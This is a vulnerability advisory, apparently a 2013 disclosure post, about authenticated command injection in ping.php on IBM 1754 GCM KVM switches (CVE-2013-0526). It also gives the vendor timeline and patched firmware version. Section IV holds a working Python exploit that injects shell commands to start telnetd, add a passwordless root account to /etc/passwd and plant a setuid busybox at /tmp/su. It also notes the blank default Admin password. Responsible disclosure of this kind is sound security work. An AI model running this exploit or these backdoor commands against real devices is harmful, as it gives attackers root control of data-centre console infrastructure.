I. Product description

The IBM 1754 GCM family provides KVM over IP and serial console management
technology in a single appliance.


II. Vulnerability information

Impact: Command execution
Remotely exploitable: yes
CVE: 2013-0526
CVS Score: 8.5


III. Vulnerability details

GCM16 (v.1.18.0.22011) and older versions of this KVM switch contain a flaw
that allows a remote authenticated user to execute unauthorized commands as
root.

This flaw exist because webapp variables are not sanitised. In this case,
parameters $count and $size from ping.php allow to create a special crafted
URL to inject text to an exec() so it can be arbitrary used to execute any
command on the KVM embedded linux.


IV. Proof of concept

Following is a simple exploit that lead to root access to the device,
opening a telnet and creating a new user with root permission without
password (sessid and target are hardcoded so it must be changed to work):


#!/usr/bin/python

"""

This exploit for Avocent KVM switch allows to gain root access to embedded
device. SessionId (avctSessionId) is neccesary for this to work, so you
need a valid user. Default user is "Admin" with blank password.

After running exploit, connect using telnet to device with user target
(pass: target) then do "/tmp/su - superb" to gain root

"""

from StringIO import StringIO
import pycurl
import re
sessid = "XXXXXXXXX"
target = "https://ip.of.kvm/ping.php" <https://172.30.30.40/ping.php>

command = "/sbin/telnetd ; echo superb::0:0:owned:/:/bin/sh >> /etc/passwd
; cp /bin/busybox /tmp/su ; chmod 6755 /tmp/su ; echo done. now connect to
device using telnet with user target and pass target, then \"/tmp/su -
superb\""

storage = StringIO()
c = pycurl.Curl()
c.setopt(c.URL, target)
c.setopt(c.SSL_VERIFYPEER,0)
c.setopt(c.SSL_VERIFYHOST,0)
c.setopt(c.WRITEFUNCTION,storage.write)
c.setopt(c.POSTFIELDS, 'address=255.255.255.255&action=ping&size=56&count=1
; echo *E* ; ' + command + ' ; echo *E*')
c.setopt(c.COOKIE,'avctSessionId=' + sessid)

try:
     c.perform()
     c.close()
except:
     print ""

content = storage.getvalue()
x1 = re.search(r"\*E\*(.*)\*E\*",content)
print x1.group(1).replace("<br />","\n")


V. Vendor Response

IBM released a new firmware that corrects this vulnerability (1.20.0.22575)


VI. Timeline

2013-06-12 - Vendor (IBM PSIRT) notified.
2013-06-12 - Vendor assigns internal ID.
2013-07-02 - Vendor confirms the vulnerability.
2013-08-16 - Vulnerability disclosed and patch released.


VII. External information

Information about this vulnerability (in spanish):
http://www.bitcloud.es/2013/08/vulnerabilidad-en-kvms-gcm1632-de-ibm.html
IBM Security Bulletin:
http://www-947.ibm.com/support/entry/portal/docdisplay?lndocid=MIGR-5093509



-- 
--
Alejandro Alvarez Bravo
alex.a.bravo@gmail.com